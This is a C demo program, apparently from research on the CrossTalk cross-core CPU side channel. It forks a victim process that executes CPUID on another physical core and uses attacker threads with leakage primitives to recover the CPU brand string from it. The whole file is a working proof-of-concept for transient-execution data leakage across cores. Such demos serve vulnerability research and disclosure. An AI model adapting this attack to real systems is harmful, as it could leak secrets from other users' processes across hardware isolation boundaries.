#include "../primitives/basic_primitives.h"
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include "utils.h"


void set_up_victim(int segment) {
    pid2 = fork();
    if (!pid2) {
        victim_cpuid(0x80000002ul + segment, offcore_cpu);
    }
    usleep(10000);
}

int main(int argc, char **args) {
    printf("Demo 1: Observing the CPU Brand String from another physical core.\n\n");
    _page_size = getpagesize();
    get_same_core_cpus(&reader_cpu, &writer_cpu);
    offcore_cpu = reader_cpu + 1;
    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", reader_cpu, writer_cpu, offcore_cpu);
    fflush(stdout);
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    crosstalk_init(argc, args);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
    pid = fork();
    if (!pid) victim_cpuid(0xABCDEF, writer_cpu);
    char staging_buffer[65];
    staging_buffer[64] = 0;
    memset(staging_buffer, '*', 64);
    printf("In Progress...\r");
    fflush(stdout);
    for (int l = 0; l < 3; l++) {
        set_up_victim(l);
        set_processor_affinity(reader_cpu);
        vector_read(mem, REPS, staging_buffer, 16*l, 16*(l+1), 0);
        kill(pid2, SIGKILL);
    }
    printf("                          \r%s\nDone.\n", staging_buffer);
    kill(pid, SIGKILL);
    usleep(10000);
    crosstalk_cleanup();
    return 0;
}

